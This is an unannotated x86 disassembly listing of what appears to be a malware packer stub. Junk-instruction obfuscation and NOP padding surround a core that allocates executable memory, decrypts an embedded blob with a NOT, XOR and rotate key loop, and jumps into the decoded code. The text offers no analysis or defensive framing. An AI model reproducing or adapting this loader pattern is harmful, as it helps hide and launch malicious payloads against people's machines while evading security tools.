  403431:	mov    BYTE PTR ds:0x4071d3,0xb0
  403438:	mov    edi,DWORD PTR ds:0x407141
  40343e:	sbb    esi,0x7d
  403441:	mov    BYTE PTR ds:0x407133,0xb
  403448:	xor    DWORD PTR ds:0x4071e8,edi
  40344e:	push   0x407259
  403453:	call   DWORD PTR ds:0x405000
  403459:	sbb    esi,ebx
  40345b:	adc    ebx,eax
  40345d:	mov    edi,DWORD PTR ds:0x4071a5
  403463:	mov    bh,BYTE PTR ds:0x4071a1
  403469:	adc    edi,eax
  40346b:	mov    BYTE PTR ds:0x407144,0xbf
  403472:	mov    BYTE PTR ds:0x40704a,0x58
  403479:	mov    esi,DWORD PTR ds:0x407076
  40347f:	sub    edi,0xffffff92
  403482:	mov    ah,BYTE PTR ds:0x407025
  403488:	or     DWORD PTR ds:0x407103,eax
  40348e:	mov    ecx,DWORD PTR ds:0x40701f
  403494:	mov    BYTE PTR ds:0x4070a3,0x59
  40349b:	mov    edx,DWORD PTR ds:0x407065
  4034a1:	sub    esi,eax
  4034a3:	mov    bh,BYTE PTR ds:0x4071af
  4034a9:	mov    esi,DWORD PTR ds:0x4070d7
  4034af:	mov    ecx,DWORD PTR ds:0x4071bf
  4034b5:	push   0x407241
  4034ba:	push   0xf
  4034bc:	push   0x407232
  4034c1:	push   0x407226
  4034c6:	push   0x407226
  4034cb:	call   DWORD PTR ds:0x405038
  4034d1:	cmp    eax,0x0
  4034d4:	jne    0x4033ee
  4034da:	add    cl,0x6
  4034dd:	xor    eax,ebx
  4034df:	add    edx,0x45
  4034e2:	sbb    DWORD PTR ds:0x40712d,edi
  4034e8:	mov    BYTE PTR ds:0x40711c,0x20
  4034ef:	xor    BYTE PTR ds:0x407006,dl
  4034f5:	add    esi,0xfffffff8
  4034f8:	sbb    esi,0xffffff9d
  4034fb:	adc    edi,ecx
  4034fd:	mov    edx,DWORD PTR ds:0x407004
  403503:	or     ecx,0xffffffb5
  403506:	mov    ebx,DWORD PTR ds:0x4071f8
  40350c:	xor    ecx,0xffffffdf
  40350f:	mov    ebx,DWORD PTR ds:0x4071c8
  403515:	add    edx,0xffffffa7
  403518:	cmp    BYTE PTR ds:0x407208,0x1
  40351f:	jb     0x40217c
  403525:	nop
  403526:	nop
  403527:	nop
  403528:	nop
  403529:	nop
  40352a:	nop
  40352b:	nop
  40352c:	nop
  40352d:	mov    ds:0x4071c5,eax
  403532:	adc    DWORD PTR ds:0x4071a1,esi
  403538:	add    ebx,edi
  40353a:	sub    eax,eax
  40353c:	add    ch,0x36
  40353f:	mov    edi,DWORD PTR ds:0x4071c4
  403545:	adc    DWORD PTR ds:0x40719b,eax
  40354b:	xor    ah,0x49
  40354e:	add    edi,0x32
  403551:	xor    DWORD PTR ds:0x4071b5,ebx
  403557:	or     DWORD PTR ds:0x4071ae,ebx
  40355d:	sub    bl,0x26
  403560:	add    esi,0xffffff87
  403563:	mov    BYTE PTR ds:0x40715c,0x95
  40356a:	mov    eax,ds:0x40707c
  40356f:	adc    DWORD PTR ds:0x4070bd,ebx
  403575:	push   0x407259
  40357a:	call   DWORD PTR ds:0x405000
  403580:	mov    BYTE PTR ds:0x407182,0x66
  403587:	add    ecx,esi
  403589:	sub    eax,0xffffff9e
  40358c:	sbb    eax,ebx
  40358e:	and    eax,0xffffffd5
  403591:	and    edi,0x4a
  403594:	mov    ecx,DWORD PTR ds:0x4070c0
  40359a:	xor    ebx,edi
  40359c:	mov    cl,BYTE PTR ds:0x40712e
  4035a2:	add    edx,eax
  4035a4:	xor    BYTE PTR ds:0x4071b8,bl
  4035aa:	add    DWORD PTR ds:0x407099,ebx
  4035b0:	add    edi,0xffffff9a
  4035b3:	sub    edx,0x42
  4035b6:	xor    eax,edx
  4035b8:	mov    BYTE PTR ds:0x40719c,0xa
  4035bf:	mov    ebx,DWORD PTR ds:0x4070c1
  4035c5:	mov    BYTE PTR ds:0x4070d2,0x9a
  4035cc:	add    ebx,esi
  4035ce:	cmp    BYTE PTR ds:0x407208,0x1
  4035d5:	jb     0x401212
  4035db:	nop
  4035dc:	nop
  4035dd:	nop
  4035de:	nop
  4035df:	nop
  4035e0:	nop
  4035e1:	nop
  4035e2:	nop
  4035e3:	nop
  4035e4:	nop
  4035e5:	nop
  4035e6:	nop
  4035e7:	nop
  4035e8:	nop
  4035e9:	nop
  4035ea:	sbb    ah,ah
  4035ec:	add    edx,ebx
  4035ee:	mov    bh,BYTE PTR ds:0x407108
  4035f4:	mov    edx,DWORD PTR ds:0x407079
  4035fa:	mov    edx,DWORD PTR ds:0x40707c
  403600:	mov    BYTE PTR ds:0x4071c7,0x76
  403607:	or     DWORD PTR ds:0x407100,ebx
  40360d:	mov    ecx,DWORD PTR ds:0x407098
  403613:	add    edi,esi
  403615:	add    edx,edx
  403617:	mov    BYTE PTR ds:0x4070e2,dh
  40361d:	xor    eax,0xffffffe5
  403620:	adc    edi,eax
  403622:	mov    dl,BYTE PTR ds:0x4070f1
  403628:	add    ecx,0x38
  40362b:	adc    eax,ebx
  40362d:	sbb    DWORD PTR ds:0x407048,ecx
  403633:	push   0x407250
  403638:	call   DWORD PTR ds:0x405014
  40363e:	test   eax,eax
  403640:	jne    0x4035ea
  403642:	add    dh,ah
  403644:	add    DWORD PTR ds:0x40718e,ebx
  40364a:	mov    BYTE PTR ds:0x407086,0xf5
  403651:	mov    BYTE PTR ds:0x40705a,0x1a
  403658:	sub    BYTE PTR ds:0x407006,al
  40365e:	add    ecx,0x48
  403661:	mov    DWORD PTR ds:0x407062,edi
  403667:	add    ecx,eax
  403669:	sbb    edx,0x78
  40366c:	mov    BYTE PTR ds:0x4071d2,0xef
  403673:	adc    edx,ecx
  403675:	xor    edx,0x3
  403678:	mov    ecx,DWORD PTR ds:0x407097
  40367e:	mov    DWORD PTR ds:0x4071c3,edi
  403684:	mov    edi,DWORD PTR ds:0x407116
  40368a:	or     eax,0x2c
  40368d:	and    ecx,0xffffffc2
  403690:	mov    BYTE PTR ds:0x40719d,0x1e
  403697:	adc    DWORD PTR ds:0x4071b0,edx
  40369d:	cmp    BYTE PTR ds:0x407208,0x1
  4036a4:	jb     0x4014f7
  4036aa:	nop
  4036ab:	nop
  4036ac:	nop
  4036ad:	nop
  4036ae:	nop
  4036af:	add    ecx,ebx
  4036b1:	add    ebx,ecx
  4036b3:	mov    ebx,DWORD PTR ds:0x4070e8
  4036b9:	mov    ebx,DWORD PTR ds:0x40713c
  4036bf:	mov    BYTE PTR ds:0x407198,0xb2
  4036c6:	sbb    bh,al
  4036c8:	adc    ecx,0x4a
  4036cb:	mov    BYTE PTR ds:0x40703a,0xfc
  4036d2:	add    eax,0x5b
  4036d5:	mov    edi,DWORD PTR ds:0x4070fc
  4036db:	or     ebx,0xfffffff6
  4036de:	add    dh,0xc1
  4036e1:	sub    DWORD PTR ds:0x4071d5,edi
  4036e7:	mov    dl,BYTE PTR ds:0x407043
  4036ed:	xor    DWORD PTR ds:0x4070e7,ebx
  4036f3:	add    eax,0xffffff8a
  4036f6:	mov    bh,BYTE PTR ds:0x407035
  4036fc:	mov    ebx,DWORD PTR ds:0x407023
  403702:	mov    ecx,DWORD PTR ds:0x40705e
  403708:	push   0x407259
  40370d:	call   DWORD PTR ds:0x405000
  403713:	mov    BYTE PTR ds:0x40708a,0x85
  40371a:	sbb    bh,0x98
  40371d:	mov    BYTE PTR ds:0x407060,0x3a
  403724:	add    edi,eax
  403726:	mov    esi,DWORD PTR ds:0x407034
  40372c:	mov    BYTE PTR ds:0x407134,0xd1
  403733:	mov    BYTE PTR ds:0x40706e,0x74
  40373a:	add    ch,0xdc
  40373d:	adc    edi,ebx
  40373f:	mov    ah,BYTE PTR ds:0x4071f5
  403745:	mov    BYTE PTR ds:0x407174,0x54
  40374c:	mov    BYTE PTR ds:0x407170,0x30
  403753:	xor    esi,edi
  403755:	adc    ecx,ecx
  403757:	sub    ebx,0xffffffa8
  40375a:	cmp    BYTE PTR ds:0x407208,0x1
  403761:	jb     0x401355
  403767:	nop
  403768:	nop
  403769:	nop
  40376a:	nop
  40376b:	nop
  40376c:	nop
  40376d:	nop
  40376e:	nop
  40376f:	nop
  403770:	xor    eax,0xffffff92
  403773:	and    ebx,0xfffffff1
  403776:	adc    DWORD PTR ds:0x407160,eax
  40377c:	sub    DWORD PTR ds:0x4071c3,ebx
  403782:	or     DWORD PTR ds:0x407084,edi
  403788:	or     edi,0x39
  40378b:	add    ecx,0x19
  40378e:	add    ecx,ebx
  403790:	adc    DWORD PTR ds:0x4071ac,ebx
  403796:	sub    DWORD PTR ds:0x40714d,edi
  40379c:	mov    esi,DWORD PTR ds:0x4070d7
  4037a2:	mov    DWORD PTR ds:0x407172,edi
  4037a8:	sub    ecx,0x1
  4037ab:	adc    ebx,0xffffffef
  4037ae:	xor    DWORD PTR ds:0x407053,ecx
  4037b4:	mov    BYTE PTR ds:0x4070e4,0xd0
  4037bb:	adc    DWORD PTR ds:0x407103,esi
  4037c1:	mov    BYTE PTR ds:0x407047,0xc4
  4037c8:	sub    eax,ecx
  4037ca:	push   0x407259
  4037cf:	call   DWORD PTR ds:0x405000
  4037d5:	add    ecx,esi
  4037d7:	xor    eax,eax
  4037d9:	xor    BYTE PTR ds:0x4071a0,ah
  4037df:	add    ebx,ebx
  4037e1:	xor    DWORD PTR ds:0x407109,ecx
  4037e7:	add    edx,0x56
  4037ea:	xor    esi,0x2f
  4037ed:	or     edi,0x33
  4037f0:	sub    ebx,ecx
  4037f2:	or     ebx,0xffffffda
  4037f5:	mov    bh,BYTE PTR ds:0x407181
  4037fb:	xor    eax,eax
  4037fd:	add    BYTE PTR ds:0x407037,dl
  403803:	mov    BYTE PTR ds:0x407182,dl
  403809:	or     DWORD PTR ds:0x407057,esi
  40380f:	or     ecx,0x1a
  403812:	push   0x407241
  403817:	push   0xf
  403819:	push   0x407232
  40381e:	push   0x407226
  403823:	push   0x407226
  403828:	call   DWORD PTR ds:0x405038
  40382e:	cmp    eax,0x0
  403831:	jne    0x403770
  403837:	mov    eax,ds:0x4070fe
  40383c:	xor    DWORD PTR ds:0x40709d,ebx
  403842:	mov    BYTE PTR ds:0x40715b,0x9b
  403849:	mov    BYTE PTR ds:0x407087,0x7f
  403850:	mov    esi,DWORD PTR ds:0x407148
  403856:	mov    ah,BYTE PTR ds:0x4071e8
  40385c:	mov    edx,DWORD PTR ds:0x407162
  403862:	mov    ebx,DWORD PTR ds:0x4071e2
  403868:	sub    DWORD PTR ds:0x407113,edi
  40386e:	mov    BYTE PTR ds:0x407074,0x65
  403875:	adc    ebx,eax
  403877:	adc    DWORD PTR ds:0x407149,edi
  40387d:	mov    al,ds:0x407167
  403882:	xor    ebx,eax
  403884:	add    edx,edi
  403886:	mov    edi,DWORD PTR ds:0x40706e
  40388c:	add    al,0xf3
  40388e:	mov    BYTE PTR ds:0x4070e7,0xfd
  403895:	mov    dl,BYTE PTR ds:0x4071e1
  40389b:	add    ecx,0x1a
  40389e:	cmp    BYTE PTR ds:0x407208,0x1
  4038a5:	jb     0x402437
  4038ab:	nop
  4038ac:	nop
  4038ad:	nop
  4038ae:	nop
  4038af:	nop
  4038b0:	nop
  4038b1:	nop
  4038b2:	nop
  4038b3:	nop
  4038b4:	nop
  4038b5:	nop
  4038b6:	nop
  4038b7:	xor    edi,edi
  4038b9:	or     edi,0x4055a6
  4038bf:	mov    ecx,0x15451777
  4038c4:	sub    ecx,0x15451737
  4038ca:	push   ecx
  4038cb:	mov    edx,0x15452737
  4038d0:	sub    edx,0x15451737
  4038d6:	push   edx
  4038d7:	mov    ecx,0x15451dab
  4038dc:	sub    ecx,0x15451737
  4038e2:	push   ecx
  4038e3:	mov    eax,0x0
  4038e8:	push   eax
  4038e9:	call   DWORD PTR ds:0x405030
  4038ef:	test   eax,eax
  4038f1:	je     0x401212
  4038f7:	push   0x659369ac
  4038fc:	pop    esi
  4038fd:	push   0xffffffff
  4038ff:	pop    edx
  403900:	and    edx,0x674
  403906:	lea    ebx,[eax]
  403908:	push   ebx
  403909:	test   edx,edx
  40390b:	je     0x403d9a
  403911:	mov    BYTE PTR ds:0x4071f5,0xea
  403918:	mov    BYTE PTR ds:0x40709d,0xf3
  40391f:	and    ecx,0x3a
  403922:	or     ch,0x1
  403925:	xor    DWORD PTR ds:0x4070d4,ecx
  40392b:	mov    BYTE PTR ds:0x407101,0x52
  403932:	add    DWORD PTR ds:0x407172,ecx
  403938:	add    ecx,ecx
  40393a:	sbb    DWORD PTR ds:0x4070cd,ecx
  403940:	xor    DWORD PTR ds:0x4070c9,ecx
  403946:	mov    BYTE PTR ds:0x407163,0xa7
  40394d:	mov    BYTE PTR ds:0x4070e1,0x7c
  403954:	sub    BYTE PTR ds:0x4070dc,cl
  40395a:	sbb    ecx,0xffffffc0
  40395d:	mov    ecx,DWORD PTR ds:0x40712a
  403963:	adc    DWORD PTR ds:0x4070d1,ecx
  403969:	mov    ecx,DWORD PTR ds:0x407058
  40396f:	xor    eax,eax
  403971:	add    eax,DWORD PTR [edi]
  403973:	mov    ecx,DWORD PTR ds:0x40702e
  403979:	mov    cl,BYTE PTR ds:0x407021
  40397f:	add    ecx,ecx
  403981:	mov    ecx,DWORD PTR ds:0x4070af
  403987:	and    DWORD PTR ds:0x40709e,ecx
  40398d:	add    DWORD PTR ds:0x4070d4,ecx
  403993:	and    DWORD PTR ds:0x4071a2,ecx
  403999:	mov    BYTE PTR ds:0x407142,0x2a
  4039a0:	mov    BYTE PTR ds:0x4070a5,0x82
  4039a7:	mov    ecx,DWORD PTR ds:0x407055
  4039ad:	or     DWORD PTR ds:0x4070e7,ecx
  4039b3:	mov    BYTE PTR ds:0x4070de,0xd
  4039ba:	xor    ecx,ecx
  4039bc:	mov    ecx,DWORD PTR ds:0x4070aa
  4039c2:	mov    ecx,DWORD PTR ds:0x407102
  4039c8:	mov    ecx,DWORD PTR ds:0x40707c
  4039ce:	mov    BYTE PTR ds:0x40716a,0x5e
  4039d5:	mov    ecx,DWORD PTR ds:0x4070ef
  4039db:	add    edi,0x4
  4039de:	mov    BYTE PTR ds:0x407175,0x52
  4039e5:	mov    BYTE PTR ds:0x40704f,0xe6
  4039ec:	add    cl,ch
  4039ee:	mov    BYTE PTR ds:0x40707f,0x92
  4039f5:	mov    BYTE PTR ds:0x4071b0,0x6a
  4039fc:	mov    ecx,DWORD PTR ds:0x407174
  403a02:	add    ecx,ecx
  403a04:	mov    BYTE PTR ds:0x40713b,0xb5
  403a0b:	mov    DWORD PTR ds:0x40716f,ecx
  403a11:	mov    ecx,DWORD PTR ds:0x407108
  403a17:	mov    BYTE PTR ds:0x407079,0xb0
  403a1e:	or     ecx,0x6d
  403a21:	add    DWORD PTR ds:0x4071fa,ecx
  403a27:	add    ch,0x1
  403a2a:	sub    DWORD PTR ds:0x4071d8,ecx
  403a30:	mov    BYTE PTR ds:0x4070f0,0x77
  403a37:	not    eax
  403a39:	mov    ecx,DWORD PTR ds:0x40718b
  403a3f:	mov    ecx,DWORD PTR ds:0x4070be
  403a45:	mov    BYTE PTR ds:0x4070bc,0x92
  403a4c:	xor    ecx,0xffffffba
  403a4f:	mov    DWORD PTR ds:0x407137,ecx
  403a55:	mov    BYTE PTR ds:0x40705f,0x8f
  403a5c:	mov    BYTE PTR ds:0x4071d9,0x43
  403a63:	add    ecx,ecx
  403a65:	add    ecx,ecx
  403a67:	mov    BYTE PTR ds:0x407091,0x85
  403a6e:	mov    BYTE PTR ds:0x4070f7,0xb0
  403a75:	mov    ecx,DWORD PTR ds:0x4071ac
  403a7b:	mov    BYTE PTR ds:0x40705d,0x31
  403a82:	add    ecx,0x62
  403a85:	sbb    DWORD PTR ds:0x4071cd,ecx
  403a8b:	adc    DWORD PTR ds:0x4071d0,ecx
  403a91:	add    eax,0xffffffe7
  403a94:	mov    ecx,DWORD PTR ds:0x407123
  403a9a:	mov    BYTE PTR ds:0x407041,0x1e
  403aa1:	add    ecx,ecx
  403aa3:	mov    BYTE PTR ds:0x40713a,0x73
  403aaa:	adc    ecx,ecx
  403aac:	sub    ecx,ecx
  403aae:	add    ecx,0x34
  403ab1:	xor    ecx,ecx
  403ab3:	mov    cl,BYTE PTR ds:0x4071ec
  403ab9:	mov    ch,BYTE PTR ds:0x407196
  403abf:	and    DWORD PTR ds:0x407081,ecx
  403ac5:	add    DWORD PTR ds:0x40711b,ecx
  403acb:	mov    ch,BYTE PTR ds:0x407072
  403ad1:	xor    ecx,0xffffffb8
  403ad4:	xor    ecx,ecx
  403ad6:	mov    BYTE PTR ds:0x40714a,0x3e
  403add:	mov    BYTE PTR ds:0x407152,0x2c
  403ae4:	add    ecx,ecx
  403ae6:	sub    ecx,ecx
  403ae8:	xor    eax,esi
  403aea:	mov    ecx,DWORD PTR ds:0x407017
  403af0:	mov    BYTE PTR ds:0x40710a,0x9f
  403af7:	mov    cl,BYTE PTR ds:0x407101
  403afd:	sbb    ecx,ecx
  403aff:	adc    ecx,ecx
  403b01:	mov    BYTE PTR ds:0x4071ae,0xa0
  403b08:	sub    ecx,ecx
  403b0a:	mov    BYTE PTR ds:0x407117,0x3b
  403b11:	and    ecx,0x31
  403b14:	or     DWORD PTR ds:0x407143,ecx
  403b1a:	sbb    ecx,ecx
  403b1c:	sbb    ecx,0xfffffffb
  403b1f:	xor    DWORD PTR ds:0x407079,ecx
  403b25:	mov    BYTE PTR ds:0x40717e,0x9c
  403b2c:	add    ecx,ecx
  403b2e:	clc    
  403b2f:	adc    eax,0x1
  403b32:	sbb    DWORD PTR ds:0x407063,ecx
  403b38:	mov    BYTE PTR ds:0x407173,0x3f
  403b3f:	and    ecx,0x3f
  403b42:	mov    ecx,DWORD PTR ds:0x4070ee
  403b48:	mov    BYTE PTR ds:0x4071a9,0xe1
  403b4f:	add    ecx,ecx
  403b51:	xor    ch,cl
  403b53:	mov    ch,BYTE PTR ds:0x4071d8
  403b59:	sub    ecx,0xffffff8d
  403b5c:	sbb    ecx,ecx
  403b5e:	mov    BYTE PTR ds:0x407061,0xc2
  403b65:	add    DWORD PTR ds:0x4071a9,ecx
  403b6b:	xor    DWORD PTR ds:0x407087,ecx
  403b71:	adc    ch,cl
  403b73:	xor    ch,ch
  403b75:	mov    ecx,DWORD PTR ds:0x40706c
  403b7b:	sbb    ecx,ecx
  403b7d:	push   eax
  403b7e:	pop    esi
  403b7f:	add    DWORD PTR ds:0x407129,ecx
  403b85:	adc    ecx,ecx
  403b87:	mov    BYTE PTR ds:0x4070a9,0x1b
  403b8e:	mov    cl,BYTE PTR ds:0x40715c
  403b94:	mov    BYTE PTR ds:0x407056,0xba
  403b9b:	mov    ecx,DWORD PTR ds:0x407110
  403ba1:	sub    ecx,ecx
  403ba3:	or     DWORD PTR ds:0x4071db,ecx
  403ba9:	mov    ch,BYTE PTR ds:0x407054
  403baf:	mov    ecx,DWORD PTR ds:0x4070bc
  403bb5:	mov    BYTE PTR ds:0x40710f,0x38
  403bbc:	add    cl,0xa7
  403bbf:	and    ecx,0x78
  403bc2:	adc    ecx,ecx
  403bc4:	mov    cl,BYTE PTR ds:0x4071d8
  403bca:	add    cl,0xc0
  403bcd:	mov    ecx,DWORD PTR ds:0x407117
  403bd3:	xor    ecx,ecx
  403bd5:	xor    cl,ch
  403bd7:	mov    ecx,DWORD PTR ds:0x4071f6
  403bdd:	rol    esi,1
  403bdf:	mov    ecx,DWORD PTR ds:0x40705a
  403be5:	sbb    ecx,0xffffffd8
  403be8:	mov    BYTE PTR ds:0x4071c0,0x9a
  403bef:	add    ecx,0xffffffe5
  403bf2:	sub    ecx,ecx
  403bf4:	mov    ecx,DWORD PTR ds:0x40710f
  403bfa:	add    ecx,ecx
  403bfc:	sub    ecx,ecx
  403bfe:	xor    ecx,0xffffffc0
  403c01:	add    DWORD PTR ds:0x4071c3,ecx
  403c07:	or     DWORD PTR ds:0x4071b3,ecx
  403c0d:	add    DWORD PTR ds:0x407093,ecx
  403c13:	mov    ecx,DWORD PTR ds:0x407143
  403c19:	mov    ecx,DWORD PTR ds:0x407094
  403c1f:	xor    ecx,ecx
  403c21:	adc    ecx,ecx
  403c23:	mov    BYTE PTR ds:0x4070e2,0x38
  403c2a:	adc    ecx,0xffffffc0
  403c2d:	rol    esi,0x7
  403c30:	sbb    DWORD PTR ds:0x407176,ecx
  403c36:	mov    ch,BYTE PTR ds:0x40716a
  403c3c:	mov    BYTE PTR ds:0x4070da,0xf2
  403c43:	mov    ecx,DWORD PTR ds:0x4071e2
  403c49:	add    ecx,ecx
  403c4b:	mov    BYTE PTR ds:0x4070c6,0x83
  403c52:	mov    ecx,DWORD PTR ds:0x4070aa
  403c58:	mov    ecx,DWORD PTR ds:0x407182
  403c5e:	adc    ecx,0x7a
  403c61:	mov    ecx,DWORD PTR ds:0x4071c2
  403c67:	mov    ecx,DWORD PTR ds:0x4071cb
  403c6d:	or     DWORD PTR ds:0x407089,ecx
  403c73:	sbb    BYTE PTR ds:0x4071ae,ch
  403c79:	xor    ecx,ecx
  403c7b:	mov    ecx,DWORD PTR ds:0x40717c
  403c81:	mov    ecx,DWORD PTR ds:0x407180
  403c87:	mov    ch,BYTE PTR ds:0x40713f
  403c8d:	mov    ecx,DWORD PTR ds:0x4070fd
  403c93:	push   eax
  403c94:	pop    DWORD PTR [ebx]
  403c96:	sbb    ecx,0xffffffba
  403c99:	mov    BYTE PTR ds:0x407125,0x17
  403ca0:	mov    ecx,DWORD PTR ds:0x40718b
  403ca6:	mov    BYTE PTR ds:0x407094,0x60
  403cad:	mov    ecx,DWORD PTR ds:0x407078
  403cb3:	add    ecx,ecx
  403cb5:	mov    BYTE PTR ds:0x407115,0x4f
  403cbc:	mov    DWORD PTR ds:0x40719e,ecx
  403cc2:	adc    cl,cl
  403cc4:	sbb    ecx,ecx
  403cc6:	mov    BYTE PTR ds:0x4071ca,0xd4
  403ccd:	adc    ecx,0x4c
  403cd0:	and    DWORD PTR ds:0x407120,ecx
  403cd6:	mov    cl,BYTE PTR ds:0x407047
  403cdc:	mov    ecx,DWORD PTR ds:0x4070d2
  403ce2:	mov    BYTE PTR ds:0x4071f1,0x26
  403ce9:	xor    cl,cl
  403ceb:	lea    ebx,[ebx+0x4]
  403cee:	mov    ecx,DWORD PTR ds:0x407120
  403cf4:	xor    ecx,0x63
  403cf7:	mov    BYTE PTR ds:0x40714d,0xfe
  403cfe:	xor    DWORD PTR ds:0x407029,ecx
  403d04:	and    DWORD PTR ds:0x4070ad,ecx
  403d0a:	sub    ecx,ecx
  403d0c:	mov    BYTE PTR ds:0x407176,ch
  403d12:	xor    ch,0xbb
  403d15:	mov    BYTE PTR ds:0x407112,0xb1
  403d1c:	sub    ecx,0xffffffb0
  403d1f:	add    ecx,0x54
  403d22:	mov    BYTE PTR ds:0x407132,0x34
  403d29:	mov    BYTE PTR ds:0x407020,0x4d
  403d30:	xor    ecx,0xffffff80
  403d33:	sub    BYTE PTR ds:0x407026,cl
  403d39:	mov    cl,BYTE PTR ds:0x40712b
  403d3f:	clc    
  403d40:	sbb    edx,0x4
  403d43:	adc    DWORD PTR ds:0x407042,ecx
  403d49:	mov    BYTE PTR ds:0x40707e,0x8f
  403d50:	sbb    ecx,ecx
  403d52:	sub    ecx,ecx
  403d54:	add    DWORD PTR ds:0x40719a,ecx
  403d5a:	add    ecx,0x46
  403d5d:	mov    BYTE PTR ds:0x407141,0xa0
  403d64:	mov    ecx,DWORD PTR ds:0x4071c2
  403d6a:	mov    BYTE PTR ds:0x4071fb,0x34
  403d71:	xor    DWORD PTR ds:0x4071e4,ecx
  403d77:	add    ecx,ecx
  403d79:	add    ecx,0x23
  403d7c:	mov    BYTE PTR ds:0x4070bd,0xe7
  403d83:	mov    BYTE PTR ds:0x4071b1,0x2f
  403d8a:	add    ecx,0x7a
  403d8d:	mov    BYTE PTR ds:0x407174,0x87
  403d94:	push   0x403909
  403d99:	ret    
  403d9a:	mov    ebx,esp
  403d9c:	mov    esi,DWORD PTR ds:0x405024
  403da2:	push   esi
  403da3:	mov    eax,ds:0x4070bb
  403da8:	xor    DWORD PTR ds:0x4070d4,esi
  403dae:	mov    BYTE PTR ds:0x4071c0,0xdb
  403db5:	mov    BYTE PTR ds:0x4070dc,0x2d
  403dbc:	sub    dh,0xbf
  403dbf:	mov    BYTE PTR ds:0x4070ba,0xf6
  403dc6:	or     ecx,0x5d
  403dc9:	add    edi,edx
  403dcb:	mov    edi,DWORD PTR ds:0x4071f3
  403dd1:	mov    edi,DWORD PTR ds:0x40700f
  403dd7:	mov    cl,BYTE PTR ds:0x407096
  403ddd:	add    ecx,0xffffffeb
  403de0:	mov    BYTE PTR ds:0x40710c,0x5b
  403de7:	sub    DWORD PTR ds:0x407134,ecx
  403ded:	add    DWORD PTR ds:0x407021,ecx
  403df3:	mov    ah,BYTE PTR ds:0x40712f
  403df9:	push   0x4038b7
  403dfe:	add    esi,edi
  403e00:	mov    BYTE PTR ds:0x4071d2,0x98
  403e07:	add    edi,0x1
  403e0a:	mov    eax,ds:0x40702b
  403e0f:	mov    ecx,DWORD PTR ds:0x40715e
  403e15:	mov    ds:0x407087,eax
  403e1a:	sub    eax,0x2b
  403e1d:	sbb    DWORD PTR ds:0x4071b6,edx
  403e23:	and    DWORD PTR ds:0x4070b5,eax
  403e29:	sub    eax,0xffffff88
  403e2c:	sbb    BYTE PTR ds:0x40700a,ch
  403e32:	and    esi,0xffffffe9
  403e35:	sub    ecx,eax
  403e37:	mov    esi,DWORD PTR ds:0x4071b2
  403e3d:	mov    ecx,DWORD PTR ds:0x4071dd
  403e43:	add    DWORD PTR ds:0x407147,ecx
  403e49:	add    eax,0x16
  403e4c:	jmp    DWORD PTR [ebx]
  403e4e:	nop
  403e4f:	nop
  403e50:	nop
  403e51:	nop
  403e52:	nop
  403e53:	nop
  403e54:	nop
  403e55:	nop
  403e56:	add    dh,0x1
  403e59:	mov    BYTE PTR ds:0x4070f2,0xae
  403e60:	adc    ebx,edx
  403e62:	sbb    DWORD PTR ds:0x407024,ebx
  403e68:	adc    BYTE PTR ds:0x4071ae,dl
  403e6e:	add    DWORD PTR ds:0x40713e,edi
  403e74:	mov    BYTE PTR ds:0x407132,0xb2
  403e7b:	sbb    DWORD PTR ds:0x4071d2,edx
  403e81:	mov    ds:0x407024,al
  403e86:	sbb    ebx,ebx
  403e88:	mov    esi,DWORD PTR ds:0x407064
  403e8e:	add    ecx,0x8
  403e91:	mov    ecx,DWORD PTR ds:0x40714c
  403e97:	mov    BYTE PTR ds:0x4071cf,0x37
  403e9e:	adc    edx,0xffffff9b
  403ea1:	adc    edi,0xffffff8c
  403ea4:	add    esi,0x68
  403ea7:	push   0x407241
  403eac:	push   0xf
  403eae:	push   0x407232
  403eb3:	push   0x407226
  403eb8:	push   0x407226
  403ebd:	call   DWORD PTR ds:0x405038
  403ec3:	test   eax,eax
  403ec5:	jne    0x403e56
  403ec7:	mov    BYTE PTR ds:0x407193,0x65
  403ece:	add    ecx,0x48
  403ed1:	mov    esi,DWORD PTR ds:0x407094
  403ed7:	add    eax,edi
  403ed9:	mov    BYTE PTR ds:0x40706e,0x3d
  403ee0:	add    edx,ebx
  403ee2:	mov    al,ds:0x40714d
  403ee7:	sbb    edx,0xffffffbb
  403eea:	add    edx,0x50
  403eed:	adc    bl,0x2d
  403ef0:	adc    ebx,0xffffffae
  403ef3:	sbb    edi,edi
  403ef5:	or     DWORD PTR ds:0x407081,eax
  403efb:	add    eax,esi
  403efd:	adc    edi,ebx
  403eff:	sbb    edi,edx
  403f01:	push   0x407259
  403f06:	call   DWORD PTR ds:0x405000
  403f0c:	or     DWORD PTR ds:0x407047,eax
  403f12:	mov    BYTE PTR ds:0x40705f,0x7a
  403f19:	mov    BYTE PTR ds:0x407196,0x65
  403f20:	sbb    esi,0x0
  403f23:	mov    BYTE PTR ds:0x407071,0x2f
  403f2a:	adc    ebx,eax
  403f2c:	mov    BYTE PTR ds:0x407199,0x58
  403f33:	or     DWORD PTR ds:0x4071d6,esi
  403f39:	sub    DWORD PTR ds:0x40701a,esi
  403f3f:	add    DWORD PTR ds:0x407041,ebx
  403f45:	mov    eax,ds:0x4071c5
  403f4a:	mov    ebx,DWORD PTR ds:0x407037
  403f50:	add    ecx,edi
  403f52:	mov    edi,DWORD PTR ds:0x40710b
  403f58:	and    DWORD PTR ds:0x4070de,ebx
  403f5e:	sub    ecx,ecx
  403f60:	add    DWORD PTR ds:0x40712d,eax
  403f66:	mov    bl,BYTE PTR ds:0x40702d
  403f6c:	sub    DWORD PTR ds:0x40711e,edi
  403f72:	adc    BYTE PTR ds:0x40713e,cl
  403f78:	cmp    BYTE PTR ds:0x407208,0x1
  403f7f:	jb     0x401e00
  403f85:	nop
  403f86:	nop
  403f87:	nop
  403f88:	nop
  403f89:	sbb    ebx,eax
  403f8b:	mov    BYTE PTR ds:0x407066,0x56
  403f92:	sbb    DWORD PTR ds:0x407103,eax
  403f98:	xor    BYTE PTR ds:0x407084,al
  403f9e:	mov    al,ds:0x40701d
  403fa3:	or     eax,0xffffffd2
  403fa6:	add    edi,0x27
  403fa9:	add    DWORD PTR ds:0x4070b0,edi
  403faf:	or     DWORD PTR ds:0x407166,eax
  403fb5:	add    edi,esi
  403fb7:	sbb    edi,eax
  403fb9:	add    ecx,0xa
  403fbc:	add    dh,bh
  403fbe:	or     eax,0xffffffc4
  403fc1:	mov    edx,DWORD PTR ds:0x4071f8
  403fc7:	mov    BYTE PTR ds:0x407145,0xaf
  403fce:	add    DWORD PTR ds:0x4070d8,esi
  403fd4:	push   0x407259
  403fd9:	call   DWORD PTR ds:0x405000
  403fdf:	add    edx,0x1c
  403fe2:	mov    ebx,DWORD PTR ds:0x4071b1
  403fe8:	add    ecx,0x17
  403feb:	sbb    edi,ecx
